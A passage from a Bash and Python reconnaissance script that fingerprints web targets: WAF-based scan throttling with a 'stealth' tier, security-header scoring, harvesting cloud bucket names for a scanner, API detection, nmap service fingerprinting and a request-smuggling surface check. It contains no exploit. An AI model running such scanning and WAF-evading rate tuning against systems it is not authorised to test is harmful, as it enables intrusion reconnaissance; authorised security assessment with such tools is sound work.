        python3 - "$detections_file" "$host_policy_file" << 'PY_RATE_POLICY' 2>/dev/null || true
import json, sys
det, out = sys.argv[1], sys.argv[2]
def bucket(row):
    vendor = (row.get("waf_vendor") or "none").lower()
    catchall = row.get("catchall_detected") is True
    js_chal  = row.get("js_challenge_detected") is True
    if js_chal:
        return ("probe-only", 10, 2)
    if vendor == "cdn-inferred" or catchall:
        return ("minimal", 15, 3)
    if vendor != "none":
        return ("stealth", 30, 5)
    return ("aggressive", 300, 50)
with open(out, "w") as w:
    seen = set()
    for line in open(det, errors="ignore"):
        line = line.strip()
        if not line: continue
        try: r = json.loads(line)
        except Exception: continue
        h = r.get("host")
        if not h or h in seen: continue
        seen.add(h)
        policy, rate, threads = bucket(r)
        w.write(json.dumps({
            "host": h.lower(),
            "waf_vendor": r.get("waf_vendor", "none"),
            "rate_hint": rate,
            "threads_hint": threads,
            "policy": policy,
        }) + "\n")
PY_RATE_POLICY
        log_info "Rate policy written: $host_policy_file"
    fi
    
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "waf_detection",
  "waf_hosts": $waf_count,
  "hosts_gated": $skipped_count,
  "wafw00f_status": "$wafw00f_status",
  "detections_file": "waf_detections.jsonl",
  "duration_seconds": $((end_time - start_time))
}
EOF
    
    log_info "WAF detection completed"
    echo "$output_file"
}
###################################################################################################
# MODULE 6: HEADER ANALYSIS AND SECURITY SCORING
###################################################################################################

module_header_analysis() {
    local target="$1"
    log_section "MODULE 6: Header Analysis"
    
    local http_confirmed="$OUTPUT_DIR/04_http_discovery/http_confirmed.json"
    local http_hosts_file="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    mkdir -p "$OUTPUT_DIR/06_header_analysis"
    local findings_file="$OUTPUT_DIR/06_header_analysis/header_findings.jsonl"
    > "$findings_file"
    # No live hosts is a valid empty state, not a module failure — degrade
    # gracefully instead of exit 1 so it doesn't inflate completed_with_errors.
    if [ ! -s "$http_confirmed" ] && [ ! -s "$http_hosts_file" ]; then
        log_warn "No HTTP hosts found — skipping header analysis"
        return 0
    fi

    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/06_header_analysis/$(make_iso_filename "$target" "header_analysis" "results")"

    # Security headers to check
    local -a SEC_HEADERS=("strict-transport-security" "content-security-policy" "x-frame-options" \
                         "x-content-type-options" "referrer-policy" "permissions-policy")

    local header_scores=0
    local hosts_analyzed=0
    
    local host_count=$(count_lines "$http_hosts_file")
    [ -z "$host_count" ] && host_count=0
    log_info "Analyzing headers for $host_count hosts..."
    
    if [ -f "$http_confirmed" ]; then
        jq -r '.url // empty' "$http_confirmed" 2>/dev/null | sort -u > "$OUTPUT_DIR/04_http_discovery/http_urls.txt"
    fi
    local urls_file="$OUTPUT_DIR/04_http_discovery/http_urls.txt"
    [ ! -f "$urls_file" ] && [ -f "$http_hosts_file" ] && cp "$http_hosts_file" "$urls_file"

    # Module 4's httpx already stored the full raw request+response (headers
    # AND body, via -sr -srd) for every URL it confirmed — reuse that file
    # directly instead of firing a second curl per host. Build a url ->
    # on-disk-file lookup once, up front.
    local stored_response_map="$OUTPUT_DIR/06_header_analysis/.stored_response_map.tsv"
    : > "$stored_response_map"
    if [ -f "$http_confirmed" ]; then
        jq -r 'select(.stored_response_path) | [.url, .stored_response_path] | @tsv' \
            "$http_confirmed" 2>/dev/null > "$stored_response_map" || true
    fi

    while IFS= read -r url; do
        [ -z "$url" ] && continue
        local host="${url#*://}"
        host="${host%%/*}"

        local response_dir="$OUTPUT_DIR/04_http_discovery/responses"
        local response_file=""
        local safe_name
        safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9._-]/_/g')

        # 1) Module 4's stored httpx response for this exact URL — no network
        #    call needed at all.
        local stored_path
        stored_path=$(awk -F'\t' -v u="$url" '$1==u{print $2; exit}' "$stored_response_map" 2>/dev/null)
        if [ -n "$stored_path" ] && [ -f "$stored_path" ]; then
            response_file="$stored_path"
        # 2) A prior probe already made in THIS module (dedup within Module 6
        #    itself, e.g. re-run/resume).
        elif [ -f "$response_dir/${safe_name}_headers.txt" ]; then
            response_file="$response_dir/${safe_name}_headers.txt"
        # 3) Fall back to a fresh curl — only reached when httpx never touched
        #    this URL (e.g. it was added by a later module).
        else
            mkdir -p "$response_dir"
            if ! curl -s -D "$response_dir/${safe_name}_headers.txt" -o /dev/null -k "$url" --max-time 8 2>/dev/null; then
                curl -s -D "$response_dir/${safe_name}_headers.txt" -o /dev/null "http://${host}/" --max-time 8 2>/dev/null || true
            fi
            response_file="$response_dir/${safe_name}_headers.txt"
        fi

        [ ! -f "$response_file" ] && continue
        
        # Score headers
        local score=0
        local missing_headers=""
        
        for header in "${SEC_HEADERS[@]}"; do
            if grep -qi "^$header:" "$response_file"; then
                ((score++))
            else
                missing_headers="${missing_headers}${header}\n"
            fi
        done
        
        # Check cookie security
        local cookie_issues=""
        if grep -qi "^set-cookie:" "$response_file"; then
            grep -i "^set-cookie:" "$response_file" | grep -qiv "httponly" && cookie_issues="${cookie_issues}missing_httponly\n"
            grep -i "^set-cookie:" "$response_file" | grep -qiv "secure" && cookie_issues="${cookie_issues}missing_secure\n"
            grep -i "^set-cookie:" "$response_file" | grep -qiv "samesite" && cookie_issues="${cookie_issues}missing_samesite\n"
        fi
        
        # Extract server banner
        local server_banner=""
        if grep -qi "^server:" "$response_file"; then
            server_banner=$(grep -i "^server:" "$response_file" | tail -1 | cut -d':' -f2- | sed 's/^[[:space:]]*//' | tr -d '\r\n')
        fi

        local missing_json cookie_json finding_json
        missing_json=$(printf '%b' "$missing_headers" | jq -Rsc 'split("\n") | map(select(length > 0))')
        cookie_json=$(printf '%b' "$cookie_issues" | jq -Rsc 'split("\n") | map(select(length > 0))')
        finding_json=$(jq -nc --arg url "$url" --arg host "$host" --arg server "$server_banner" \
            --argjson score "$score" --argjson missing "$missing_json" --argjson cookies "$cookie_json" \
            '{url:$url,host:$host,security_header_score:$score,missing_headers:$missing,cookie_issues:$cookies,server_banner:$server}')
        printf '%s\n' "$finding_json" >> "$findings_file"
        update_manifest_bulk "$host" "$finding_json"
        
        header_scores=$((header_scores + score))
        ((hosts_analyzed++))

    done < "$urls_file"

    local avg_score=0
    [ $hosts_analyzed -gt 0 ] && avg_score=$((header_scores / hosts_analyzed))

    # ── S3 / Cloud Storage Header Detection + URL Extraction ──
    log_info "Running S3/Cloud storage header detection and URL extraction..."
    python3 - "$http_confirmed" "$OUTPUT_DIR/09_crawling/all_urls.txt" "$MANIFEST_FILE" \
        "$OUTPUT_DIR/06_header_analysis/s3_detections.json" \
        "$OUTPUT_DIR/06_header_analysis/s3_url_extractions.txt" << 'S3DETECT_EOF'
import json, sys, re, os
from collections import defaultdict

httpx_file  = sys.argv[1]
crawled_f   = sys.argv[2]
manifest_f  = sys.argv[3]
out_detect  = sys.argv[4]
out_buckets = sys.argv[5]

# ── S3 URL patterns from crawled pages ──────────────────────────────
S3_URL_PATTERNS = [
    # https://bucket.s3.amazonaws.com/...
    re.compile(r'https?://([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com', re.I),
    # https://s3.amazonaws.com/bucket/...
    re.compile(r'https?://s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com/([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])', re.I),
    # Pre-signed URLs with X-Amz-Credential containing region
    re.compile(r'https?://([a-z0-9][a-z0-9.\-]{1,61}[a-z0-9])\.s3[^?]*\?.*X-Amz-Credential', re.I),
    # Azure Blob
    re.compile(r'https?://([a-z0-9]{3,24})\.blob\.core\.windows\.net', re.I),
    # GCP Storage
    re.compile(r'https?://storage\.googleapis\.com/([a-z0-9][a-z0-9._-]{1,220}[a-z0-9])', re.I),
    re.compile(r'https?://([a-z0-9][a-z0-9._-]{1,220}[a-z0-9])\.storage\.googleapis\.com', re.I),
]

AWS_REGION_IN_URL = re.compile(
    r's3[.-](?:website-)?([a-z]{2}-[a-z]+-\d+)\.amazonaws\.com'
    r'|s3\.([a-z]{2}-[a-z]+-\d+)\.amazonaws\.com', re.I)

def url_provider(url):
    u = url.lower()
    if 'amazonaws.com' in u: return 'aws'
    if 'blob.core.windows.net' in u: return 'azure'
    if 'googleapis.com' in u: return 'gcp'
    return 'unknown'

def url_region(url):
    m = AWS_REGION_IN_URL.search(url)
    if m:
        return next((g for g in m.groups() if g), None)
    return None

# ── Parse httpx entries for header-based S3 detection ───────────────
detections = []  # per-host S3 detection results
seen_hosts = set()

if os.path.exists(httpx_file):
    with open(httpx_file, errors='ignore') as f:
        for line in f:
            try:
                e = json.loads(line.strip())
            except Exception:
                continue
            host = e.get('host') or e.get('input', '')
            if not host or host in seen_hosts:
                continue
            seen_hosts.add(host)

            server = (e.get('webserver') or '').strip()
            status = e.get('status_code', 0)
            ct = (e.get('content_type') or '').lower()
            tech = [t.lower() for t in (e.get('tech') or [])]

            # Collect response headers (httpx stores them in header dict)
            headers = {}
            for hdr_key in ('header', 'headers'):
                h = e.get(hdr_key)
                if isinstance(h, dict):
                    headers = {k.lower(): (v if isinstance(v, str) else
                               v[0] if isinstance(v, list) and v else '')
                               for k, v in h.items()}
                    break

            detection = None
            confidence = 'none'
            detail = ''

            # ── Layer 1: Server == "AmazonS3" ──
            if server.lower() == 'amazons3':
                detection = 'direct_s3_exposure'
                confidence = 'high'
                detail = f'Server header: {server}'

            # ── Layer 2: x-amz-request-id / x-amz-id-2 (custom server header) ──
            elif headers.get('x-amz-request-id') or headers.get('x-amz-id-2'):
                detection = 'direct_s3_exposure_custom_server'
                confidence = 'high'
                amz_rid = headers.get('x-amz-request-id', '')
                detail = f'x-amz-request-id present ({amz_rid[:16]}...) but Server={server or "unset"}'

            # ── Layer 3: CloudFront proxy → deep inspection ──
            elif (headers.get('x-amz-cf-id')
                  or 'cloudfront' in headers.get('via', '')
                  or 'cloudfront' in server.lower()):
                # CloudFront is confirmed; check if S3 is the origin
                cf_detail = 'CloudFront proxy detected'
                # Deep inspection: S3-origin behind CloudFront?
                ct_base = ct.split(';')[0].strip()
                body_raw = e.get('body', '') or ''

                if (status in (403, 404) and ct_base in ('application/xml', 'text/xml')):
                    # S3 error pages behind CloudFront are XML with <HostId> or AccessDenied
                    if ('<HostId>' in body_raw or '<Code>AccessDenied</Code>' in body_raw
                            or '<Code>NoSuchBucket</Code>' in body_raw
                            or '<Code>NoSuchKey</Code>' in body_raw):
                        detection = 's3_origin_behind_cloudfront'
                        confidence = 'medium'
                        detail = f'{cf_detail}; {status} XML response with S3 error markers'
                    else:
                        detection = 'cloudfront_proxy_active'
                        confidence = 'low'
                        detail = f'{cf_detail}; {status} XML but no S3 error markers'
                else:
                    detection = 'cloudfront_proxy_active'
                    confidence = 'info'
                    detail = cf_detail

            # ── Layer 4: Tech-stack confirmation (cross-validate) ──
            if detection is None and any(t in ('amazon s3', 's3', 'aws s3') for t in tech):
                detection = 'tech_detect_s3'
                confidence = 'medium'
                detail = f'Tech fingerprint: {[t for t in tech if "s3" in t]}'

            if detection:
                det = {
                    'host': host, 'detection': detection,
                    'confidence': confidence, 'detail': detail,
                    'server': server, 'status_code': status,
                }
                detections.append(det)

# ── Extract S3/cloud bucket names from crawled URLs ─────────────────
extracted_buckets = set()
url_extractions = []

if os.path.exists(crawled_f):
    with open(crawled_f, errors='ignore') as f:
        for line in f:
            url = line.strip()
            if not url:
                continue
            for pat in S3_URL_PATTERNS:
                m = pat.search(url)
                if m:
                    bucket = m.group(1) if m.lastindex else ''
                    if bucket and len(bucket) >= 3:
                        prov = url_provider(url)
                        region = url_region(url) if prov == 'aws' else None
                        extraction = {
                            'url': url[:300], 'bucket': bucket,
                            'provider': prov,
                        }
                        if region:
                            extraction['aws_region'] = region
                        url_extractions.append(extraction)
                        if prov == 'aws':
                            extracted_buckets.add(bucket)
                    break

# ── Write outputs ───────────────────────────────────────────────────
output = {
    'header_detections': detections,
    'url_extractions': url_extractions,
    'summary': {
        'direct_s3': sum(1 for d in detections if 'direct_s3' in d['detection']),
        'cloudfront_s3_origin': sum(1 for d in detections if d['detection'] == 's3_origin_behind_cloudfront'),
        'cloudfront_proxy': sum(1 for d in detections if d['detection'] == 'cloudfront_proxy_active'),
        'tech_detect': sum(1 for d in detections if d['detection'] == 'tech_detect_s3'),
        'url_extracted_buckets': len(extracted_buckets),
    }
}
with open(out_detect, 'w') as f:
    json.dump(output, f, indent=2)

# Write bucket names for downstream S3Scanner
with open(out_buckets, 'w') as f:
    for b in sorted(extracted_buckets):
        f.write(b + '\n')

# ── Update manifest with S3 header detections (lock-and-modify-in-place) ─
if os.path.exists(manifest_f):
    import time
    # Build per-host delta
    host_deltas = {}
    for det in detections:
        h = det['host']
        if det['confidence'] in ('high', 'medium'):
            host_deltas[h] = {
                'is_s3': True,
                'is_cloud_storage': True,
                'cloud_storage_provider': 'aws',
                's3_detection_method': det['detection'],
                's3_detection_confidence': det['confidence'],
                'tech_tag': 'S3',
                'is_api': False,
            }

    lock_dir = manifest_f + '.lock.d'
    locked = False
    for _ in range(50):
        try:
            os.mkdir(lock_dir)
            locked = True
            break
        except FileExistsError:
            try:
                age = time.time() - os.path.getmtime(lock_dir)
                if age > 60:
                    os.rmdir(lock_dir)
                    continue
            except OSError:
                pass
            time.sleep(0.1)

    try:
        with open(manifest_f, 'r') as f:
            current = json.load(f)
        current.setdefault('hosts', {})
        for h, upd in host_deltas.items():
            if h in current['hosts']:
                current['hosts'][h].update(upd)
        tmp = manifest_f + '.tmp'
        with open(tmp, 'w') as f:
            json.dump(current, f, indent=2)
        os.replace(tmp, manifest_f)
    except (OSError, IOError, json.JSONDecodeError) as e:
        print(f"[s3_detect] manifest update failed: {e}", file=sys.stderr)
    finally:
        if locked:
            try:
                os.rmdir(lock_dir)
            except OSError:
                pass

s = output['summary']
print(f"S3-detect: direct={s['direct_s3']} cf-origin={s['cloudfront_s3_origin']} "
      f"cf-proxy={s['cloudfront_proxy']} tech={s['tech_detect']} url-buckets={s['url_extracted_buckets']}")
S3DETECT_EOF

    # ── API endpoint detection ──
    log_info "Running API endpoint detection..."
    local api_count=0
    api_count=$(python3 - "$http_confirmed" "$OUTPUT_DIR/09_crawling/all_urls.txt" "$MANIFEST_FILE" << 'APIDETECT_EOF'
import json, sys, re, os

httpx_file = sys.argv[1]
crawled_file = sys.argv[2]
manifest_file = sys.argv[3]

API_CONTENT_TYPES = {'application/json', 'application/xml', 'application/grpc',
                     'text/xml', 'application/soap+xml', 'application/graphql',
                     'application/vnd.api+json', 'application/hal+json',
                     'application/problem+json'}
API_PATH_RE = re.compile(r'/api/|/v[0-9]+[./]|/graphql|/rest/|/ws/|/rpc/|/oauth|/token|/auth/|/webhook|/callback|/health|/status|/metrics|/docs/|/swagger|/openapi', re.I)
API_SERVER_BANNERS = {'gunicorn', 'uvicorn', 'kestrel', 'fastapi', 'express',
                      'daphne', 'puma', 'thin', 'phusion', 'openresty'}
HTML_TECH = {'react', 'jquery', 'bootstrap', 'angular', 'vue', 'wordpress',
             'drupal', 'joomla', 'wix', 'squarespace', 'next.js', 'nuxt',
             'tailwind', 'materialize'}
CLOUD_STORAGE_TECH = {'amazon s3', 's3', 'aws s3', 'google cloud storage',
                      'google-storage', 'azure blob storage', 'azure-blob',
                      'digitalocean spaces', 'alibaba oss'}

# Parse httpx data per host
host_httpx = {}
if os.path.exists(httpx_file):
    with open(httpx_file, errors='ignore') as f:
        for line in f:
            try:
                e = json.loads(line.strip())
                host = e.get('host') or e.get('input', '')
                if not host:
                    continue
                host_httpx.setdefault(host, []).append(e)
            except Exception:
                continue

# Parse crawled URLs per host
host_crawled = {}
if os.path.exists(crawled_file):
    with open(crawled_file, errors='ignore') as f:
        for line in f:
            url = line.strip()
            if not url:
                continue
            try:
                h = url.split('//')[1].split('/')[0].split(':')[0]
                host_crawled.setdefault(h, []).append(url)
            except Exception:
                continue

# Load manifest
manifest = {}
if os.path.exists(manifest_file):
    with open(manifest_file) as f:
        manifest = json.load(f)

api_hosts = {}

for host, entries in host_httpx.items():
    signals = []
    is_cloud_storage = False

    for e in entries:
        ct = (e.get('content_type') or '').lower().strip()
        path = e.get('path', '/')
        words = e.get('words', 0) or 0
        lines = e.get('lines', 0) or 0
        tech = [t.lower() for t in (e.get('tech') or [])]
        server = (e.get('webserver') or '').lower()

        if any(t in CLOUD_STORAGE_TECH for t in tech):
            is_cloud_storage = True

        # Tier 1: API content-type + API path pattern
        ct_base = ct.split(';')[0].strip()
        is_api_ct = ct_base in API_CONTENT_TYPES
        is_api_path = bool(API_PATH_RE.search(path))

        if is_api_ct and is_api_path:
            signals.append('content_type+path')

        # Tier 2: API content-type + compact response (JSON blob, not HTML)
        if is_api_ct and words > 0 and lines <= 3:
            signals.append('content_type+compact_response')

        # Tier 3: API content-type + no HTML framework in tech stack
        if is_api_ct:
            has_html_tech = any(t in HTML_TECH for t in tech)
            if not has_html_tech:
                signals.append('content_type+no_html_tech')

        # Tier 4: API server banner + API content-type
        if is_api_ct and any(b in server for b in API_SERVER_BANNERS):
            signals.append('api_server+content_type')

    if is_cloud_storage:
        # Cloud object storage (e.g. S3) serves application/xml natively;
        # don't let that content-type signal alone tag it as an API.
        signals = [s for s in signals if s != 'content_type+no_html_tech']

    # Tier 5: crawled URLs show API paths, and no crawled URL returned HTML for this host
    crawled = host_crawled.get(host, [])
    api_urls = [u for u in crawled if API_PATH_RE.search(u)]
    if api_urls and not is_cloud_storage:
        # Check if any httpx entry for this host had text/html as primary
        has_html_primary = any(
            (e.get('content_type') or '').startswith('text/html')
            and (e.get('words', 0) or 0) > 100
            for e in entries
        )
        if not has_html_primary:
            signals.append('crawled_api_paths+no_html')
        else:
            signals.append('crawled_api_paths_mixed')

    if is_cloud_storage:
        api_hosts[host] = {
            'is_api': False,
            'is_s3': True,
            'api_signals': [],
            'api_urls': [],
        }
    elif signals:
        # Deduplicate
        unique_signals = list(dict.fromkeys(signals))
        # Definite API: tier 1 or 2 or (tier 3 + server banner)
        is_definite = any(s in unique_signals for s in
            ['content_type+path', 'content_type+compact_response', 'api_server+content_type'])
        is_api_host = any(s in unique_signals for s in
            ['content_type+no_html_tech', 'crawled_api_paths+no_html'])
        # Mixed host (HTML root + API paths): still API if 3+ distinct API URLs found
        if not is_definite and not is_api_host and 'crawled_api_paths_mixed' in unique_signals:
            if len(api_urls) >= 3:
                is_api_host = True

        if is_definite or is_api_host:
            api_hosts[host] = {
                'is_api': True,
                'api_signals': unique_signals,
                'api_urls': api_urls[:10],
            }

# Tier 6: crawl-only hosts — hosts with API URLs in crawled data but NOT in httpx
# (e.g., found only via gau cache / CDX but httpx didn't probe them directly)
for host, urls in host_crawled.items():
    if host in api_hosts or host in host_httpx:
        continue
    crawl_api = [u for u in urls if API_PATH_RE.search(u)]
    if len(crawl_api) >= 3:
        api_hosts[host] = {
            'is_api': True,
            'api_signals': ['crawl_only_api_paths'],
            'api_urls': crawl_api[:10],
        }

# Write to manifest (lock-and-modify-in-place — do NOT overwrite hosts)
count = 0
if api_hosts:
    # Build per-host delta
    host_deltas = {}
    for host, api_data in api_hosts.items():
        if api_data.get('is_s3'):
            host_deltas[host] = {'is_api': False, 'is_s3': True, 'tech_tag': 'S3'}
        else:
            host_deltas[host] = {'is_api': True, 'api_signals': api_data['api_signals']}
            count += 1

    import time
    lock_dir = manifest_file + '.lock.d'
    locked = False
    for _ in range(50):
        try:
            os.mkdir(lock_dir)
            locked = True
            break
        except FileExistsError:
            try:
                age = time.time() - os.path.getmtime(lock_dir)
                if age > 60:
                    os.rmdir(lock_dir)
                    continue
            except OSError:
                pass
            time.sleep(0.1)

    try:
        with open(manifest_file, 'r') as f:
            current = json.load(f)
        current.setdefault('hosts', {})
        for host, upd in host_deltas.items():
            if host in current['hosts']:
                current['hosts'][host].update(upd)
            else:
                current['hosts'][host] = upd
        tmp = manifest_file + '.tmp'
        with open(tmp, 'w') as f:
            json.dump(current, f, indent=2)
        os.replace(tmp, manifest_file)
    except (OSError, IOError, json.JSONDecodeError) as e:
        print(f"[api_detect] manifest update failed: {e}", file=sys.stderr)
    finally:
        if locked:
            try:
                os.rmdir(lock_dir)
            except OSError:
                pass

print(count)
APIDETECT_EOF
    ) || api_count=0

    log_info "API endpoints detected: $api_count hosts"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "header_analysis",
  "hosts_analyzed": $hosts_analyzed,
  "average_score": $avg_score,
  "api_hosts_detected": $api_count,
  "findings_file": "header_findings.jsonl",
  "duration_seconds": $((end_time - start_time))
}
EOF

    log_info "Header analysis completed"
    echo "$output_file"
}
###################################################################################################
# MODULE 7: SERVICE FINGERPRINTING (Non-HTTP)
###################################################################################################

module_service_fingerprint() {
    local target="$1"
    log_section "MODULE 7: Service Fingerprinting"
    
    local ports_file="$OUTPUT_DIR/14_port_scan/all_ports_list.txt"
    [ ! -s "$ports_file" ] && { log_info "No open ports from the full port scan"; return 0; }
    command -v "$NMAP" &>/dev/null || { log_warn "nmap is unavailable; service fingerprinting skipped"; return 0; }
    
    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/07_service_fingerprint/$(make_iso_filename "$target" "service_fingerprint" "results")"
    
    log_info "Fingerprinting services discovered by the full port scan..."

    # Build per-host port lists so nmap only scans ports actually open on each host,
    # not a Cartesian product of all hosts x all ports.
    local nmap_targets="$OUTPUT_DIR/07_service_fingerprint/nmap_targets.txt"
    awk -F: '{hosts[$1] = hosts[$1] ? hosts[$1] "," $2 : $2} END {for (h in hosts) print h " -p " hosts[h]}' \
        "$ports_file" > "$nmap_targets"
    [ ! -s "$nmap_targets" ] && { log_warn "No valid ports to fingerprint"; return 0; }

    # Collect unique hosts and their union of ports for a single nmap invocation.
    # Nmap's -iL takes hosts (not host:port), so we pass all unique hosts and the
    # union of ports. While this still scans all ports on all hosts, nmap's own
    # service detection is efficient with closed ports (instant RST). The per-host
    # list above is kept for reference/debugging.
    sed -E 's/:[0-9]+$//' "$ports_file" | sort -u > "$OUTPUT_DIR/07_service_fingerprint/hosts.txt"
    local nmap_ports
    nmap_ports=$(sed -E 's/^.*:([0-9]+)$/\1/' "$ports_file" | sort -nu | paste -sd, -)

    # Run nmap service detection
    run_tool nmap "$NMAP" -sV -Pn -iL "$OUTPUT_DIR/07_service_fingerprint/hosts.txt" -p "$nmap_ports" \
        --version-intensity 5 -oX "$OUTPUT_DIR/07_service_fingerprint/nmap_results.xml" \
        --max-retries 2 -T4 > /dev/null
    
    # Parse nmap XML and update manifest
    if [ -f "$OUTPUT_DIR/07_service_fingerprint/nmap_results.xml" ]; then
        python3 - "$OUTPUT_DIR/07_service_fingerprint/nmap_results.xml" "$MANIFEST_FILE" \
            "$OUTPUT_DIR/07_service_fingerprint/services.json" << 'PYTHON_EOF'
import xml.etree.ElementTree as ET
import json
import sys

try:
    tree = ET.parse(sys.argv[1])
    root = tree.getroot()
    
    # Read manifest
    try:
        with open(sys.argv[2], 'r') as f:
            manifest = json.load(f)
    except:
        manifest = {'hosts': {}}
    
    findings = []
    for host in root.findall('.//host'):
        addr = host.find('address[@addrtype="ipv4"]')
        if addr is None:
            continue
        ip = addr.get('addr')
        hostname_node = host.find('hostnames/hostname')
        hostname = hostname_node.get('name') if hostname_node is not None else ip
        host_services = []
        
        for port in host.findall('.//port'):
            state = port.find('state')
            if state is None or state.get('state') != 'open':
                continue
            port_num = port.get('portid')
            service = port.find('service')
            name = service.get('name', 'unknown') if service is not None else 'unknown'
            tunnel = service.get('tunnel', '') if service is not None else ''
            item = {
                'host': hostname,
                'ip': ip,
                'port': int(port_num),
                'protocol': port.get('protocol', 'tcp'),
                'name': name,
                'product': service.get('product', '') if service is not None else '',
                'version': service.get('version', '') if service is not None else '',
                'extrainfo': service.get('extrainfo', '') if service is not None else '',
                'tunnel': tunnel,
                'cpe': [cpe.text for cpe in service.findall('cpe')] if service is not None else [],
                'service_type': 'http' if 'http' in name.lower() else 'non_http'
            }
            findings.append(item)
            host_services.append(item)

        if host_services:
            manifest_key = hostname
            if manifest_key not in manifest.get('hosts', {}):
                manifest_key = next((key for key, value in manifest.get('hosts', {}).items() if value.get('ip') == ip), hostname)
            manifest.setdefault('hosts', {}).setdefault(manifest_key, {})
            manifest['hosts'][manifest_key]['ip'] = ip
            manifest['hosts'][manifest_key]['ports_open'] = sorted({item['port'] for item in host_services})
            manifest['hosts'][manifest_key]['services'] = host_services
    
    with open(sys.argv[2], 'w') as f:
        json.dump(manifest, f, indent=2)
    with open(sys.argv[3], 'w') as f:
        json.dump(findings, f, indent=2)
    print(f"Parsed {len(findings)} open services")
except Exception as e:
    print(f"Error: {e}", file=sys.stderr)
    raise
PYTHON_EOF
    fi

    # Detect proxy ports (false positives in non-HTTP service list)
    # Many hosts run HTTP proxies on non-standard ports; nmap identifies these as
    # http-proxy, squid-http, nginx, haproxy, etc. These should not be counted as
    # non-HTTP services and should be flagged as potential false positives.
    if [ -f "$OUTPUT_DIR/07_service_fingerprint/services.json" ]; then
        python3 - "$OUTPUT_DIR/07_service_fingerprint/services.json" \
            "$OUTPUT_DIR/07_service_fingerprint/proxy_ports.json" \
            "$OUTPUT_DIR/14_port_scan/non_http_ports.txt" \
            "$MANIFEST_FILE" << 'PROXY_DETECT_EOF'
import json
import sys
import re

PROXY_INDICATORS = [
    'http-proxy', 'socks-proxy', 'socks4', 'socks5',
    'squid', 'haproxy', 'nginx', 'apache',
    'varnish', 'envoy', 'traefik', 'caddy',
]
PROXY_PRODUCT_PATTERNS = re.compile(
    r'squid|haproxy|nginx|apache|varnish|envoy|traefik|caddy|'
    r'tinyproxy|privoxy|polipo|ccproxy|delegate|3proxy',
    re.IGNORECASE
)
HTTP_SERVICE_NAMES = re.compile(
    r'^(http|https|http-proxy|http-alt|ssl/http|https-alt)$',
    re.IGNORECASE
)

with open(sys.argv[1]) as f:
    services = json.load(f)

proxy_ports = []
reclassified = 0
for svc in services:
    if svc.get('service_type') != 'non_http':
        continue
    name = svc.get('name', '').lower()
    product = svc.get('product', '').lower()
    tunnel = svc.get('tunnel', '').lower()
    extrainfo = svc.get('extrainfo', '').lower()

    is_proxy = False
    reason = ''

    # Check if nmap identified it as an HTTP or proxy service
    if HTTP_SERVICE_NAMES.match(name):
        is_proxy = True
        reason = f'nmap service name "{name}" is HTTP-based'
    elif name in PROXY_INDICATORS:
        is_proxy = True
        reason = f'nmap service name "{name}" is a known proxy'
    elif PROXY_PRODUCT_PATTERNS.search(product):
        is_proxy = True
        reason = f'product "{svc.get("product", "")}" is a known proxy/web server'
    elif tunnel == 'ssl' and ('http' in name or 'http' in product):
        is_proxy = True
        reason = f'SSL-wrapped HTTP service on non-standard port'
    elif 'proxy' in extrainfo or 'proxy' in product:
        is_proxy = True
        reason = f'proxy keyword in service metadata'

    if is_proxy:
        svc['service_type'] = 'http'
        svc['proxy_false_positive'] = True
        svc['proxy_reason'] = reason
        proxy_ports.append({
            'host': svc['host'],
            'port': svc['port'],
            'name': svc.get('name', ''),
            'product': svc.get('product', ''),
            'reason': reason
        })
        reclassified += 1

# Write updated services back
with open(sys.argv[1], 'w') as f:
    json.dump(services, f, indent=2)

# Write proxy port report
with open(sys.argv[2], 'w') as f:
    json.dump(proxy_ports, f, indent=2)

# Remove proxy false positives from non_http_ports.txt
if proxy_ports:
    proxy_set = {f"{p['host']}:{p['port']}" for p in proxy_ports}
    try:
        with open(sys.argv[3]) as f:
            lines = [l.strip() for l in f if l.strip()]
        with open(sys.argv[3], 'w') as f:
            for line in lines:
                if line not in proxy_set:
                    f.write(line + '\n')
    except FileNotFoundError:
        pass

# Update manifest with proxy flags
try:
    with open(sys.argv[4]) as f:
        manifest = json.load(f)
    for p in proxy_ports:
        host = p['host']
        if host in manifest.get('hosts', {}):
            manifest['hosts'][host].setdefault('proxy_ports', []).append(p['port'])
    with open(sys.argv[4], 'w') as f:
        json.dump(manifest, f, indent=2)
except (FileNotFoundError, json.JSONDecodeError):
    pass

if reclassified:
    print(f"Reclassified {reclassified} proxy false-positives from non-HTTP to HTTP")
else:
    print("No proxy false-positives detected")
PROXY_DETECT_EOF

        local proxy_count=$(jq 'length' "$OUTPUT_DIR/07_service_fingerprint/proxy_ports.json" 2>/dev/null || echo 0)
        if [ "$proxy_count" -gt 0 ]; then
            log_info "Identified $proxy_count proxy port false-positives (reclassified as HTTP):"
            jq -r '.[] | "  \(.host):\(.port) — \(.reason)"' "$OUTPUT_DIR/07_service_fingerprint/proxy_ports.json" 2>/dev/null | head -20
        fi
    fi

    local service_count=$(jq 'length' "$OUTPUT_DIR/07_service_fingerprint/services.json" 2>/dev/null || echo 0)
    local non_http_count=$(jq '[.[] | select(.service_type == "non_http")] | length' "$OUTPUT_DIR/07_service_fingerprint/services.json" 2>/dev/null || echo 0)
    local proxy_fp_count=$(jq 'length' "$OUTPUT_DIR/07_service_fingerprint/proxy_ports.json" 2>/dev/null || echo 0)
    update_statistics "services_fingerprinted" "$service_count"
    update_statistics "proxy_false_positives" "$proxy_fp_count"

    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "service_fingerprint",
  "services_fingerprinted": $service_count,
  "non_http_services": $non_http_count,
  "proxy_false_positives": $proxy_fp_count,
  "services_file": "services.json",
  "proxy_report": "proxy_ports.json",
  "duration_seconds": $((end_time - start_time))
}
EOF

    log_info "Service fingerprinting completed ($proxy_fp_count proxy false-positives filtered)"
    echo "$output_file"
}
###################################################################################################
# MODULE 8: DIRECTORY DISCOVERY
###################################################################################################

module_hrs_detect() {
    # Module 8C: safe HTTP Request Smuggling SURFACE assessment. Fingerprints
    # the HTTP stack and scores parser-inconsistency indicators. NEVER sends
    # desync/malformed requests — only well-formed differentials. Output is an
